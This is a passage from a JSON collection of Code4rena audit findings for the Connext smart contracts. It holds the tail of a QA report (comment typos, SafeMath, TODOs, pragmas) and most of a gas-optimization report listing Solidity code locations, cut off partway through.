liquidity for this transfer.\n```\n\n- a sthe\n\n```solidity\ncore/connext/facets/BridgeFacet.sol:1059:    // Because we are using the `_amount` a sthe maximum amount in, the `amountIn` should always be\n```\n\n- sournce\n\n```solidity\ncore/connext/facets/ProposedOwnableFacet.sol:143:    // Contract as sournce of truth\ncore/connext/facets/ProposedOwnableFacet.sol:163:    // Contract as sournce of truth\ncore/connext/facets/ProposedOwnableFacet.sol:176:    // Contract as sournce of truth\ncore/connext/helpers/ProposedOwnableUpgradeable.sol:170:    // Contract as sournce of truth\ncore/connext/helpers/ProposedOwnableUpgradeable.sol:198:    // Contract as sournce of truth\n```\n\n- rlayer\n\n```solidity\ncore/connext/facets/RelayerFacet.sol:35:   * @notice Emitted when a rlayer is added or removed from whitelists\n```\n\n- specicfied\n\n```solidity\ncore/connext/facets/RoutersFacet.sol:575:    // transfer to specicfied recipient IF recipient not set\n```\n\n- callabale\n\n```solidity\ncore/connext/helpers/Executor.sol:17: * @notice This library contains an `execute` function that is callabale by\n```\n\n- everytime\n\n```solidity\ncore/connext/helpers/LPToken.sol:41:   * minting and burning. This ensures that Swap.updateUserWithdrawFees are called everytime.\n```\n\n- stabelswap\n\n```solidity\ncore/connext/libraries/AssetLogic.sol:30:   * @notice Check if the stabelswap pool exists or not\n```\n\n- briding\n\n```solidity\ncore/connext/libraries/LibConnextStorage.sol:278:   * @notice Stores whether or not briding, AMMs, have been paused\n```\n\n- identifer\n\n```solidity\ncore/connext/libraries/LibCrossDomainProperty.sol:35:  uint256 private constant PROPERTY_LEN = 25; // 1 byte identifer + 4 bytes domain + 20 bytes address\n```\n\n- incomming\n\n```solidity\ncore/promise/PromiseRouter.sol:50:   * @dev While handling the message, it will parse transferId from incomming message and store the message in the mapping\n```\n\n## 4. Deprecated library used for Solidity `>= 0.8` : SafeMath\n\n```solidity\ncore/connext/helpers/ConnextPriceOracle.sol:2:pragma solidity 0.8.14;\ncore/connext/helpers/ConnextPriceOracle.sol:4:import {SafeMath} from \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\ncore/connext/helpers/ConnextPriceOracle.sol:45:  using SafeMath for uint256;\n\ncore/connext/helpers/OZERC20.sol:2:pragma solidity 0.8.14;\ncore/connext/helpers/OZERC20.sol:10:import \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\ncore/connext/helpers/OZERC20.sol:37:  using SafeMath for uint256;\n\ncore/connext/libraries/AmplificationUtils.sol:2:pragma solidity 0.8.14;\ncore/connext/libraries/AmplificationUtils.sol:5:import {SafeMath} from \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\ncore/connext/libraries/AmplificationUtils.sol:15:  using SafeMath for uint256;\n\ncore/connext/libraries/SwapUtils.sol:2:pragma solidity 0.8.14;\ncore/connext/libraries/SwapUtils.sol:4:import {SafeMath} from \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\ncore/connext/libraries/SwapUtils.sol:20:  using SafeMath for uint256;\n```\n\n## 5. Open TODOS\n\nConsider resolving the TODOs before deploying.\n\n```solidity\ncore/connext/facets/AssetFacet.sol:66:  function canonicalToAdopted(bytes32 _canonicalId) public view returns (address) {\ncore/connext/facets/AssetFacet.sol:67:    return s.canonicalToAdopted[_canonicalId];\ncore/connext/facets/AssetFacet.sol:150:    s.canonicalToAdopted[_canonical.id] = supported;\ncore/connext/facets/AssetFacet.sol:185:    delete s.canonicalToAdopted[_canonicalId];\ncore/connext/facets/BridgeFacet.sol:492:      // TODO: do we want to store a mapping of custodied token balances here?\ncore/connext/facets/BridgeFacet.sol:579:      // TODO: do we need to keep this\ncore/connext/facets/BridgeFacet.sol:1027:    // TODO: Should we call approve(0) and approve(totalRepayAmount) instead? or with a try catch to not affect gas on all cases?\ncore/connext/helpers/Executor.sol:7:// TODO: see note in below file re: npm\ncore/connext/interfaces/IConnextHandler.sol:22:  function canonicalToAdopted(bytes32 _canonicalId) external view returns (address);\ncore/connext/libraries/AssetLogic.sol:204:    address adopted = s.canonicalToAdopted[id];\ncore/connext/libraries/AssetLogic.sol:244:    address adopted = s.canonicalToAdopted[id];\ncore/connext/libraries/AssetLogic.sol:376:    address adopted = s.canonicalToAdopted[id];\ncore/connext/libraries/LibConnextStorage.sol:178:  mapping(bytes32 => address) canonicalToAdopted;\ncore/connext/libraries/LibConnextStorage.sol:303:  // BridgeFacet (cont.) TODO: can we move this\n```\n\n## 6. Adding a `return` statement when the function defines a named return variable, is redundant\n\nWhile not consuming more gas with the Optimizer enabled: using both named returns and a return statement isn't necessary. Removing one of those can improve code clarity.\n\nAffected code:\n\n- contracts/contracts/core/connext/facets/StableSwapFacet.sol:\n\n```solidity\n  212:   ) external view returns (uint256 availableTokenAmount) {\n  213:     return s.swapStorages[canonicalId].calculateWithdrawOneToken(tokenAmount, tokenIndex);\n```\n\n- contracts/contracts/core/connext/helpers/StableSwap.sol:\n\n```solidity\n  295:     returns (uint256 availableTokenAmount)\n  297:     return swapStorage.calculateWithdrawOneToken(tokenAmount, tokenIndex);\n```\n\n## 7. The pragmas used are not the same everywhere\n\nConsider using only 1 version. Here's an example of the different pragmas:\n\n```solidity\ncore/connext/facets/upgrade-initializers/DiamondInit.sol:2:pragma solidity ^0.8.0;\ncore/connext/facets/AssetFacet.sol:2:pragma solidity 0.8.14;\ncore/connext/interfaces/IAavePool.sol:2:pragma solidity ^0.8.11;\ncore/shared/Router.sol:2:pragma solidity >=0.6.11;\n```\n\n## 8. Non-library/interface files should use fixed compiler versions, not floating ones\n\n```solidity\ncore/connext/facets/upgrade-initializers/DiamondInit.sol:2:pragma solidity ^0.8.0;\ncore/shared/Router.sol:2:pragma solidity >=0.6.11;\ncore/shared/XAppConnectionClient.sol:2:pragma solidity >=0.6.11;\n```\n\n## 9. Missing NatSpec\n\n```solidity\nFile: AssetFacet.sol\n121:   /**\n122:    * @notice Used to add supported assets. This is an admin only function\n123:    * @dev When whitelisting the canonical asset, all representational assets would be\n124:    * whitelisted as well. In the event you have a different adopted asset (i.e. PoS USDC\n125:    * on polygon), you should *not* whitelist the adopted asset. The stable swap pool\n126:    * address used should allow you to swap between the local <> adopted asset\n127:    * @param _canonical - The canonical asset to add by id and domain. All representations\n128:    * will be whitelisted as well\n129:    * @param _adoptedAssetId - The used asset id for this domain (i.e. PoS USDC for\n130:    * polygon)\n131:    */\n132:   function setupAsset(\n133:     ConnextMessage.TokenId calldata _canonical,\n134:     address _adoptedAssetId,\n135:     address _stableSwapPool // @audit-info [INFO] NatSpec missing for _stableSwapPool\n136:   ) external onlyOwner {\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-06-connext-findings",
      "repo": "https://github.com/code-423n4/2022-06-connext-findings",
      "url": "https://github.com/code-423n4/2022-06-connext-findings/issues/263"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "**Overview**\n\nRisk Rating | Number of issues\n--- | ---\nGas Issues | 16\n\n**Table of Contents:**\n\n- [1. Avoid unnecessary calculation when `_args.amount == 0`](#1-avoid-unnecessary-calculation-when-_argsamount--0)\n- [2. Cheap Contract Deployment Through Clones](#2-cheap-contract-deployment-through-clones)\n- [3. Avoid emitting a storage variable when a memory value is available](#3-avoid-emitting-a-storage-variable-when-a-memory-value-is-available)\n- [4. Reduce the size of error messages (Long revert Strings)](#4-reduce-the-size-of-error-messages-long-revert-strings)\n- [5. SafeMath is not needed when using Solidity version 0.8+](#5-safemath-is-not-needed-when-using-solidity-version-08)\n- [6. `>=` is cheaper than `>` (and `<=` cheaper than `<`)](#6--is-cheaper-than--and--cheaper-than-)\n- [7. Splitting `require()` statements that use `&&` saves gas](#7-splitting-require-statements-that-use--saves-gas)\n- [8. Using private rather than public for constants saves gas](#8-using-private-rather-than-public-for-constants-saves-gas)\n- [9. `<array>.length` should not be looked up in every loop of a `for-loop`](#9-arraylength-should-not-be-looked-up-in-every-loop-of-a-for-loop)\n- [10. `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)](#10-i-costs-less-gas-compared-to-i-or-i--1-same-for---i-vs-i---or-i---1)\n- [11. Increments/decrements can be unchecked in for-loops](#11-incrementsdecrements-can-be-unchecked-in-for-loops)\n- [12. It costs more gas to initialize variables with their default value than letting the default value be applied](#12-it-costs-more-gas-to-initialize-variables-with-their-default-value-than-letting-the-default-value-be-applied)\n- [13. A variable should be immutable](#13-a-variable-should-be-immutable)\n- [14. Use Custom Errors instead of Revert Strings to save Gas](#14-use-custom-errors-instead-of-revert-strings-to-save-gas)\n- [15. Functions guaranteed to revert when called by normal users can be marked `payable`](#15-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable)\n- [16. Use scientific notation (e.g. `1e18`) rather than exponentiation (e.g. `10**18`)](#16-use-scientific-notation-eg-1e18-rather-than-exponentiation-eg-1018)\n\n## 1. Avoid unnecessary calculation when `_args.amount == 0`\n\n[Here](https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/facets/BridgeFacet.sol#L762), if `_args.amount == 0` (which is possible), there should be a return statement to avoid unnecessary gas consumption:\n\n```solidity\nFile: BridgeFacet.sol\n762:     uint256 toSwap = _args.amount; // @audit-info [INFO] amount can be 0 meaning that this should return to avoid unnecessary gas consumption. Recommendation: add a if (_args.amount == 0) return;\n```\n\n## 2. Cheap Contract Deployment Through Clones\n\n```solidity\ncore/connext/facets/upgrade-initializers/DiamondInit.sol:73:      s.executor = new Executor(address(this));\n```\n\nThere's a way to save a significant amount of gas on deployment using Clones: <https://www.youtube.com/watch?v=3Mw-pMmJ7TA> .\n\nThis is a solution that was adopted, as an example, by Porter Finance. They realized that deploying using clones was 10x cheaper:\n\n- <https://github.com/porter-finance/v1-core/issues/15#issuecomment-1035639516>\n- <https://github.com/porter-finance/v1-core/pull/34>\n\nConsider applying a similar pattern.\n\n## 3. Avoid emitting a storage variable when a memory value is available\n\nWhen they are the same, consider emitting the memory value instead of the storage value:\n\n```solidity\ncontracts/contracts/core/connext/helpers/ProposedOwnableUpgradeable.sol:\n  320    function _setProposed(address newlyProposed) private {\n  321      _proposedOwnershipTimestamp = block.timestamp;\n  322      _proposed = newlyProposed;\n  323:     emit OwnershipProposed(_proposed); //@audit should emit newlyProposed\n\ncontracts/contracts/core/shared/ProposedOwnable.sol:\n  169    function _setProposed(address newlyProposed) private {\n  170      _proposedOwnershipTimestamp = block.timestamp;\n  171      _proposed = newlyProposed;\n  172:     emit OwnershipProposed(_proposed);//@audit should emit newlyProposed\n  173    }\n```\n\n## 4. Reduce the size of error messages (Long revert Strings)\n\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.\n\nRevert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.\n\nRevert strings > 32 bytes:\n\n```solidity\ncore/connext/helpers/OZERC20.sol:185:    require(_sender != address(0), \"ERC20: transfer from the zero address\");\ncore/connext/helpers/OZERC20.sol:186:    require(_recipient != address(0), \"ERC20: transfer to the zero address\");\ncore/connext/helpers/OZERC20.sol:190:    balances[_sender] = balances[_sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\ncore/connext/helpers/OZERC20.sol:226:    require(_account != address(0), \"ERC20: burn from the zero address\");\ncore/connext/helpers/OZERC20.sol:230:    balances[_account] = balances[_account].sub(_amount, \"ERC20: burn amount exceeds balance\");\ncore/connext/helpers/OZERC20.sol:253:    require(_owner != address(0), \"ERC20: approve from the zero address\");\ncore/connext/helpers/OZERC20.sol:254:    require(_spender != address(0), \"ERC20: approve to the zero address\");\ncore/connext/libraries/LibDiamond.sol:66:    require(msg.sender == diamondStorage().contractOwner, \"LibDiamond: Must be contract owner\");\ncore/connext/libraries/LibDiamond.sol:113:        revert(\"LibDiamondCut: Incorrect FacetCutAction\");\ncore/connext/libraries/LibDiamond.sol:121:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\");\ncore/connext/libraries/LibDiamond.sol:123:    require(_facetAddress != address(0), \"LibDiamondCut: Add facet can't be address(0)\");\ncore/connext/libraries/LibDiamond.sol:132:      require(oldFacetAddress == address(0), \"LibDiamondCut: Can't add function that already exists\");\ncore/connext/libraries/LibDiamond.sol:139:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\");\ncore/connext/libraries/LibDiamond.sol:141:    require(_facetAddress != address(0), \"LibDiamondCut: Add facet can't be address(0)\");\ncore/connext/libraries/LibDiamond.sol:150:      require(oldFacetAddress != _facetAddress, \"LibDiamondCut: Can't replace function with same function\");\ncore/connext/libraries/LibDiamond.sol:158:    require(_functionSelectors.length > 0, \"LibDiamondCut: No selectors in facet to cut\");\ncore/connext/libraries/LibDiamond.sol:161:    require(_facetAddress == address(0), \"LibDiamondCut: Remove facet address must be address(0)\");\ncore/connext/libraries/LibDiamond.sol:170:    enforceHasContractCode(_facetAddress, \"LibDiamondCut: New facet has no code\");\ncore/connext/libraries/LibDiamond.sol:191:    require(_facetAddress != address(0), \"LibDiamondCut: Can't remove function that doesn't exist\");\ncore/connext/libraries/LibDiamond.sol:193:    require(_facetAddress != address(this), \"LibDiamondCut: Can't remove immutable function\");\ncore/connext/libraries/LibDiamond.sol:224:      require(_calldata.length == 0, \"LibDiamondCut: _init is address(0) but_calldata is not empty\");\ncore/connext/libraries/LibDiamond.sol:226:      require(_calldata.length > 0, \"LibDiamondCut: _calldata is empty but _init is not address(0)\");\ncore/connext/libraries/LibDiamond.sol:228:        enforceHasContractCode(_init, \"LibDiamondCut: _init address has no code\");\ncore/connext/libraries/LibDiamond.sol:236:          revert(\"LibDiamondCut: _init function reverted\");\ncore/connext/libraries/SwapUtils.sol:595:        balances[i] = balances[i].sub(amounts[i], \"Cannot withdraw more than available\");\ncore/connext/libraries/SwapUtils.sol:697:    require(dy <= self.balances[tokenIndexTo], \"Cannot get more than pool balance\");\ncore/connext/libraries/SwapUtils.sol:784:    require(dy <= self.balances[tokenIndexTo], \"Cannot get more than pool balance\");\ncore/connext/libraries/SwapUtils.sol:1015:        balances1[i] = v.balances[i].sub(amounts[i], \"Cannot withdraw more than available\");\n```\n\nConsider shortening the revert strings to fit in 32 bytes.\n\n## 5. SafeMath is not needed when using Solidity version 0.8+\n\nSolidity version 0.8+ already implements overflow and underflow checks by default.\nUsing the SafeMath library from OpenZeppelin (which is more gas expensive than the 0.8+ overflow checks) is therefore redundant.\n\nConsider using the built-in checks instead of SafeMath and remove SafeMath here:\n\n```solidity\ncore/connext/helpers/ConnextPriceOracle.sol:2:pragma solidity 0.8.14;\ncore/connext/helpers/ConnextPriceOracle.sol:4:import {SafeMath} from \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\ncore/connext/helpers/ConnextPriceOracle.sol:45:  using SafeMath for uint256;\n\ncore/connext/helpers/OZERC20.sol:2:pragma solidity 0.8.14;\ncore/connext/helpers/OZERC20.sol:10:import \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\ncore/connext/helpers/OZERC20.sol:37:  using SafeMath for uint256;\n\ncore/connext/libraries/AmplificationUtils.sol:2:pragma solidity 0.8.14;\ncore/connext/libraries/AmplificationUtils.sol:5:import {SafeMath} from \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\ncore/connext/libraries/AmplificationUtils.sol:15:  using SafeMath for uint256;\n\ncore/connext/libraries/SwapUtils.sol:2:pragma solidity 0.8.14;\ncore/connext/libraries/SwapUtils.sol:4:import {SafeMath} from \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\ncore/connext/libraries/SwapUtils.sol:20:  using SafeMath for uint256;\n```\n\n## 6. `>=` is cheaper than `>` (and `<=` cheaper than `<`)\n\nStrict inequalities (`>`) are more expensive than non-strict ones (`>=`). This is due to some supplementary checks (ISZERO, 3 gas). This also holds true between `<=` and `<`.  \n\nConsider replacing strict inequalities with non-strict ones to save some gas here:\n\n```solidity\ncore/connext/helpers/SponsorVault.sol:214:      sponsoredFee = balance < _liquidityFee ? balance : _liquidityFee;\ncore/connext/helpers/SponsorVault.sol:258:      sponsoredFee = sponsoredFee > address(this).balance ? address(this).balance : sponsoredFee;\n```\n\n## 7. Splitting `require()` statements that use `&&` saves gas\n\nIf you're using the Optimizer at 200, instead of using the `&&` operator in a single require statement to check multiple conditions, Consider using multiple require statements with 1 condition per require statement:\n\n```solidity\ncore/connext/helpers/StableSwap.sol:85:          tokenIndexes[address(_pooledTokens[i])] == 0 && _pooledTokens[0] != _pooledTokens[i],\ncore/connext/libraries/AmplificationUtils.sol:86:    require(futureA_ > 0 && futureA_ < MAX_A, \"futureA_ must be > 0 and < MAX_A\");\ncore/connext/libraries/SwapUtils.sol:397:    require(tokenIndexFrom < numTokens && tokenIndexTo < numTokens, \"Tokens must be in pool\");\ncore/connext/libraries/SwapUtils.sol:493:    require(tokenIndexFrom < xp.length && tokenIndexTo < xp.length, \"Token index out of range\");\ncore/connext/libraries/SwapUtils.sol:524:    require(tokenIndexFrom < xp.length && tokenIndexTo < xp.length, \"Token index out of range\");\ncore/connext/libraries/SwapUtils.sol:1007:    require(maxBurnAmount <= v.lpToken.balanceOf(msg.sender) && maxBurnAmount != 0, \">LP.balanceOf\");\n```\n\nPlease, note that this might not hold true at a higher number of runs for the Optimizer (10k). However, it indeed is true at 200.\n\n## 8. Using private rather than public for constants saves gas\n\nIf needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table\n\n```solidity\ncore/connext/facets/BridgeFacet.sol:68:  uint16 public constant AAVE_REFERRAL_CODE = 0;\ncore/connext/helpers/PriceOracle.sol:6:  bool public constant isPriceOracle = true;\ncore/connext/libraries/AmplificationUtils.sol:21:  uint256 public constant A_PRECISION = 100;\ncore/connext/libraries/AmplificationUtils.sol:22:  uint256 public constant MAX_A = 10**6;\ncore/connext/libraries/LibCrossDomainProperty.sol:37:  bytes29 public constant EMPTY = hex\"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\";\ncore/connext/libraries/LibCrossDomainProperty.sol:38:  bytes public constant EMPTY_BYTES = hex\"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\";\ncore/shared/Version.sol:9:  uint8 public constant VERSION = 0; \n```\n\n## 9. `<array>.length` should not be looked up in every loop of a `for-loop`\n\nReading array length at each iteration of the loop consumes more gas than necessary.\n  \nIn the best case scenario (length read on a memory variable), caching the array length in the stack saves around 3 gas per iteration.\nIn the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.\n\nHere, Consider storing the array's length in a variable before the for-loop, and use this new variable instead:\n\n```solidity\ncore/connext/facets/RelayerFacet.sol:140:    for (uint256 i; i < _transferIds.length; ) {\ncore/connext/facets/RelayerFacet.sol:164:    for (uint256 i; i < _transferIds.length; ) {\ncore/connext/facets/StableSwapFacet.sol:415:    for (uint8 i = 0; i < _pooledTokens.length; i++) {\ncore/connext/helpers/ConnextPriceOracle.sol:176:    for (uint256 i = 0; i < tokenAddresses.length; i++) {\ncore/connext/helpers/Multicall.sol:16:    for (uint256 i = 0; i < calls.length; i++) {\ncore/connext/helpers/StableSwap.sol:81:    for (uint8 i = 0; i < _pooledTokens.length; i++) {\ncore/connext/libraries/LibDiamond.sol:104:    for (uint256 facetIndex; facetIndex < _diamondCut.length; facetIndex++) {\ncore/connext/libraries/LibDiamond.sol:129:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) {\ncore/connext/libraries/LibDiamond.sol:147:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) {\ncore/connext/libraries/LibDiamond.sol:162:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) {\ncore/connext/libraries/SwapUtils.sol:205:    for (uint256 i = 0; i < xp.length; i++) {\ncore/connext/libraries/SwapUtils.sol:558:    for (uint256 i = 0; i < balances.length; i++) {\ncore/connext/libraries/SwapUtils.sol:591:    for (uint256 i = 0; i < balances.length; i++) {\ncore/connext/libraries/SwapUtils.sol:844:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:869:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:924:    for (uint256 i = 0; i < amounts.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1014:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1019:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1039:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1055:    for (uint256 i = 0; i < pooledTokens.length; i++) {\n```\n\n## 10. `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)\n\nPre-increments and pre-decrements are cheaper.\n\nFor a `uint256 i` variable, the following is true with the Optimizer enabled at 10k:\n\n**Increment:**\n\n- `i += 1` is the most expensive form\n- `i++` costs 6 gas less than `i += 1`\n- `++i` costs 5 gas less than `i++` (11 gas less than `i += 1`)\n\n**Decrement:**\n\n- `i -= 1` is the most expensive form\n- `i--` costs 11 gas less than `i -= 1`\n- `--i` costs 5 gas less than `i--` (16 gas less than `i -= 1`)\n\nNote that post-increments (or post-decrements) return the old value before incrementing or decrementing, hence the name *post-increment*:\n\n```solidity\nuint i = 1;  \nuint j = 2;\nrequire(j == i++, \"This will be false as i is incremented after the comparison\");\n```\n  \nHowever, pre-increments (or pre-decrements) return the new value:\n  \n```solidity\nuint i = 1;  \nuint j = 2;\nrequire(j == ++i, \"This will be true as i is incremented before the comparison\");\n```\n  \nIn the pre-increment case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`.  \n  \nAffected code:  \n\n```solidity\ncore/connext/facets/BridgeFacet.sol:332:      s.nonce += 1;\ncore/connext/facets/BridgeFacet.sol:613:          i++;\ncore/connext/facets/BridgeFacet.sol:684:          i++;\ncore/connext/facets/BridgeFacet.sol:799:            i++;\ncore/connext/facets/DiamondLoupeFacet.sol:31:    for (uint256 i; i < numFacets; i++) {\ncore/connext/facets/RelayerFacet.sol:144:        i++;\ncore/connext/facets/RelayerFacet.sol:168:        i++;\ncore/connext/facets/StableSwapFacet.sol:415:    for (uint8 i = 0; i < _pooledTokens.length; i++) {\ncore/connext/helpers/ConnextPriceOracle.sol:176:    for (uint256 i = 0; i < tokenAddresses.length; i++) {\ncore/connext/helpers/Multicall.sol:16:    for (uint256 i = 0; i < calls.length; i++) {\ncore/connext/helpers/StableSwap.sol:81:    for (uint8 i = 0; i < _pooledTokens.length; i++) {\ncore/connext/libraries/Encoding.sol:22:    for (uint8 i = 0; i < 10; i += 1) {\ncore/connext/libraries/Encoding.sol:36:    for (uint8 i = 31; i > 15; i -= 1) {\ncore/connext/libraries/Encoding.sol:45:      for (uint8 i = 15; i < 255; i -= 1) {\ncore/connext/libraries/LibDiamond.sol:104:    for (uint256 facetIndex; facetIndex < _diamondCut.length; facetIndex++) {\ncore/connext/libraries/LibDiamond.sol:129:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) {\ncore/connext/libraries/LibDiamond.sol:134:      selectorPosition++;\ncore/connext/libraries/LibDiamond.sol:147:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) {\ncore/connext/libraries/LibDiamond.sol:153:      selectorPosition++;\ncore/connext/libraries/LibDiamond.sol:162:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) {\ncore/connext/libraries/SwapUtils.sol:205:    for (uint256 i = 0; i < xp.length; i++) {\ncore/connext/libraries/SwapUtils.sol:254:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:268:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) {\ncore/connext/libraries/SwapUtils.sol:289:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:300:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) {\ncore/connext/libraries/SwapUtils.sol:302:      for (uint256 j = 0; j < numTokens; j++) {\ncore/connext/libraries/SwapUtils.sol:344:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:405:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:425:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) {\ncore/connext/libraries/SwapUtils.sol:558:    for (uint256 i = 0; i < balances.length; i++) {\ncore/connext/libraries/SwapUtils.sol:591:    for (uint256 i = 0; i < balances.length; i++) {\ncore/connext/libraries/SwapUtils.sol:844:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:869:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:924:    for (uint256 i = 0; i < amounts.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1014:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1019:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1039:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1055:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/relayer-fee/libraries/RelayerFeeMessage.sol:85:        i++;\n```\n\nConsider using pre-increments and pre-decrements where they are relevant (meaning: not where post-increments/decrements logic are relevant).\n\n## 11. Increments/decrements can be unchecked in for-loops\n\nIn Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.  \n  \n[ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)\n\nAffected code:  \n\n```solidity\ncore/connext/facets/DiamondLoupeFacet.sol:31:    for (uint256 i; i < numFacets; i++) {\ncore/connext/facets/StableSwapFacet.sol:415:    for (uint8 i = 0; i < _pooledTokens.length; i++) {\ncore/connext/helpers/ConnextPriceOracle.sol:176:    for (uint256 i = 0; i < tokenAddresses.length; i++) {\ncore/connext/helpers/Multicall.sol:16:    for (uint256 i = 0; i < calls.length; i++) {\ncore/connext/helpers/StableSwap.sol:81:    for (uint8 i = 0; i < _pooledTokens.length; i++) {\ncore/connext/libraries/LibDiamond.sol:104:    for (uint256 facetIndex; facetIndex < _diamondCut.length; facetIndex++) {\ncore/connext/libraries/LibDiamond.sol:129:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) {\ncore/connext/libraries/LibDiamond.sol:147:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) {\ncore/connext/libraries/LibDiamond.sol:162:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) {\ncore/connext/libraries/SwapUtils.sol:205:    for (uint256 i = 0; i < xp.length; i++) {\ncore/connext/libraries/SwapUtils.sol:254:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:268:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) {\ncore/connext/libraries/SwapUtils.sol:289:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:300:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) {\ncore/connext/libraries/SwapUtils.sol:302:      for (uint256 j = 0; j < numTokens; j++) {\ncore/connext/libraries/SwapUtils.sol:344:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:405:    for (uint256 i = 0; i < numTokens; i++) {\ncore/connext/libraries/SwapUtils.sol:425:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) {\ncore/connext/libraries/SwapUtils.sol:558:    for (uint256 i = 0; i < balances.length; i++) {\ncore/connext/libraries/SwapUtils.sol:591:    for (uint256 i = 0; i < balances.length; i++) {\ncore/connext/libraries/SwapUtils.sol:844:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:869:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:924:    for (uint256 i = 0; i < amounts.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1014:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1019:      for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1039:    for (uint256 i = 0; i < pooledTokens.length; i++) {\ncore/connext/libraries/SwapUtils.sol:1055:    for (uint256 i = 0; i < pooledTokens.length; i++) {\n```\n\nThe change would be:  \n  \n```diff\n- for (uint256 i; i < numIterations; i++) {\n+ for (uint256 i; i < numIterations;) {\n // ...  \n+   unchecked { ++i; }\n}  \n```\n\nThe same can be applied with decrements (which should use `break` when `i == 0`).\n\nThe risk of overflow is non-existant for `uint256` here.\n\n## 12. It costs more gas to initialize variables with their default value than letting the default value be applied\n\nIf a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n\nAs an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`\n\nAffected code:\n\n```solidity\ncore/connext/facets/StableSwapFacet.sol:415:    for (uint8 i = 0; i < _pooledTokens.length; i++) {\ncore/connext/helpers/ConnextPriceOracle.sol:176:    for (uint256 i = 0; i < tokenAddresses.length; i++) {\ncore/connext/helpers/Multicall.sol:16:    for (uint256 i = 0; i < calls.length; i++) {\ncore/connext/helpers/StableSwap.sol:81:    for (uint8 i = 0; i < _pooledTokens.length; i++) {\ncore/connext/libraries/Encoding.sol:22:    for (uint8 i = 0; i < 10; i += 1) 